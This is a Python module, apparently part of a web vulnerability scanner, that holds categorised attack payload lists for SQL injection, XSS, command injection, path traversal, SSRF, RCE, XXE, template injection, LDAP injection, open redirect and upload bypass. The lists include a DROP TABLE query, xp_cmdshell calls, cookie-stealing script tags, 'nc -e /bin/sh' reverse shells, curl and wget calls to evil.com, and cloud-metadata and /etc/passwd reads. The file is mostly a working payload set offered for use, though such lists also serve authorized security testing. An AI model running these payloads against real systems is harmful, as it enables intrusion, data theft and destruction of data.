"""Payload definitions — SQLi, XSS, CMDi, path traversal, SSRF, RCE, XXE, LFI, SSTI, LDAP, NoSQL, etc."""

# ──────────────────────────────────────────────
# SQL Injection
# ──────────────────────────────────────────────
SQLI = [
    # Basic auth bypass
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "\" OR 1=1 --",
    "admin' --",
    "admin' #",
    "admin' OR '1'='1",
    "admin\" --",
    # Union-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT @@version,user(),database()--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    # Blind
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND SLEEP(5)--",
    "' AND 1=1 AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
    "'; IF (1=2) WAITFOR DELAY '0:0:5'--",
    # Error-based
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "\" AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
    # Stacked queries
    "'; SELECT 1; --",
    "'; DROP TABLE users; --",
    "'; EXEC xp_cmdshell('whoami'); --",
    "'; EXEC xp_cmdshell('dir'); --",
    # NoSQL
    "' || '1'=='1",
    "' && '1'=='1",
    "admin' || '1'=='1",
    # MySQL specific
    "'/*!50000*/OR 1=1--",
    "' OR 'a'<>'b'--",
    "' OR 'a'='a'",
    "'||'1'='1",
    # Postgres specific
    "'; SELECT pg_sleep(5);--",
    "'; CREATE TABLE test(id INT);--",
]

# ──────────────────────────────────────────────
# XSS
# ──────────────────────────────────────────────
XSS = [
    # Basic
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    # Attribute-based
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><svg/onload=alert(1)>",
    "' autofocus onfocus=alert(1) '",
    "\" autofocus onfocus=alert(1) \"",
    # Event handlers
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<div onmouseover=alert(1)>x</div>",
    # Bypass filters
    "<ScRiPt>alert(1)</ScRiPt>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script/random>alert(1)</script>",
    "<script/src=data:text/javascript,alert(1)>",
    "<script>eval('alert(1)')</script>",
    # Polyglot
    "\"'><img src=x onerror=alert(1)>",
    "\" ONMOUSEOVER=alert(1) \"",
    # DOM-based
    "#<script>alert(1)</script>",
    "javascript:alert(1)",
    "<a href=javascript:alert(1)>x</a>",
    # Encoding bypass
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<math><mtext></mtext><svg><script>alert(1)</script>",
]

# ──────────────────────────────────────────────
# Command Injection
# ──────────────────────────────────────────────
CMDI = [
    "; id",
    "; ls",
    "; whoami",
    "; cat /etc/passwd",
    "| id",
    "| whoami",
    "| ls -la",
    "& whoami",
    "&& whoami",
    "|| whoami",
    "`id`",
    "`whoami`",
    "$(id)",
    "$(whoami)",
    "| nc -e /bin/sh 127.0.0.1 4444",
    "; nc -e /bin/sh 127.0.0.1 4444",
    "| ping -n 3 127.0.0.1",
    "| ping -c 3 127.0.0.1",
    "; ping -n 3 127.0.0.1",
    "| curl http://evil.com/",
    "; curl http://evil.com/",
    "| wget http://evil.com/",
    # Windows specific
    "& dir C:\\",
    "| dir C:\\",
    "& whoami &",
    "| findstr /i admin",
    # Bypass
    "c'a't /etc/passwd",
    "c\"a\"t /etc/passwd",
    "c$@at /etc/passwd",
    "who$()ami",
    "who''ami",
    "who$@ami",
]

# ──────────────────────────────────────────────
# Path Traversal / LFI
# ──────────────────────────────────────────────
TRAVERSAL = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../" * 10 + "etc/passwd",
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\boot.ini",
    # URL encoded
    "%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "..%c0%ae..%c0%ae..%c0%aeetc/passwd",
    # Null byte
    "../../etc/passwd%00",
    "../../etc/passwd%00.html",
    "../../etc/passwd\\x00.txt",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://input",
    "expect://id",
    "file:///etc/passwd",
    # Windows
    ".../.../.../etc/passwd",
    "..\\..\\..\\etc\\passwd",
    "../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//....//etc/hostname",
]

# ──────────────────────────────────────────────
# SSRF
# ──────────────────────────────────────────────
SSRF = [
    "http://127.0.0.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/",
    "http://localhost/",
    "http://localhost:8080/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0/",
    "http://2130706433/",
    "http://0x7f000001/",
    "http://017700000001/",
    "http://internal.app/",
    "http://metadata.google.internal/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "file:///etc/passwd",
    "file:///etc/shadow",
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aping%0d%0a",
    "dict://127.0.0.1:6379/info",
]

# ──────────────────────────────────────────────
# RCE
# ──────────────────────────────────────────────
RCE = [
    ";echo 'testing_rce';",
    "|echo testing_rce|",
    "&echo testing_rce&",
    "`echo testing_rce`",
    "$(echo testing_rce)",
    "'; echo 'testing_rce'; '",
    "\"; echo 'testing_rce'; \"",
    ";print(md5(1));",
    "|print(md5(1));|",
    # Java
    "${7*7}",
    "${java:os}",
    "${''.getClass().forName('java.lang.Runtime').getMethod('exec', ''.getClass()).invoke(null, 'id')}",
    # Python
    "__import__('os').system('id')",
    "__import__('os').popen('id').read()",
    # ASP
    "'; Response.Write('test'); '",
    # Node.js
    "process.mainModule.require('child_process').execSync('id')",
]

# ──────────────────────────────────────────────
# XXE
# ──────────────────────────────────────────────
XXE = [
    "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
    "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><root>&xxe;</root>",
    "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><root>&xxe;</root>",
    "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://127.0.0.1/'>]><root>&xxe;</root>",
]

# ──────────────────────────────────────────────
# SSTI
# ──────────────────────────────────────────────
SSTI = [
    "{{7*7}}",
    "{{7*'7'}}",
    "<%= 7*7 %>",
    "${7*7}",
    "#{7*7}",
    "*{7*7}",
    "{{config}}",
    "{{self}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
    "${7*7}",
    "$${7*7}",
    "@@7*7@@",
]

# ──────────────────────────────────────────────
# LDAP Injection
# ──────────────────────────────────────────────
LDAP = [
    "*)(uid=*))(|(uid=*",
    "*)(|(password=*",
    "*)(|(cn=*",
    "admin*",
    "admin*)((|userPassword=*)",
    "*)(&",
]

# ──────────────────────────────────────────────
# Open Redirect
# ──────────────────────────────────────────────
REDIRECT = [
    "//evil.com",
    "https://evil.com/",
    "http://evil.com/",
    "//evil.com@valid.com",
    "////evil.com",
    "/\\evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]


# ──────────────────────────────────────────────
# 上传绕过
# ──────────────────────────────────────────────
UPLOAD = [
    ".php",
    ".php5",
    ".pht",
    ".phtml",
    ".php%00.jpg",
    ".php.\x00.jpg",
    ".php.jpg",
    ".php;.jpg",
    ".PhP",
    ".asp",
    ".aspx",
    ".cer",
    ".asa",
    ".jsp",
    ".jspx",
    ".war",
]

# ──────────────────────────────────────────────
# ALL — 汇总所有payload
# ──────────────────────────────────────────────
def get_all():
    """返回包含分类标签的所有 payload。"""
    all_payloads = []
    for cat, items in [
        ("sqli", SQLI), ("xss", XSS), ("cmdi", CMDI),
        ("traversal", TRAVERSAL), ("ssrf", SSRF), ("rce", RCE),
        ("xxe", XXE), ("ssti", SSTI), ("ldap", LDAP),
        ("redirect", REDIRECT),
    ]:
        for p in items:
            all_payloads.append((cat, p))
    return all_payloads
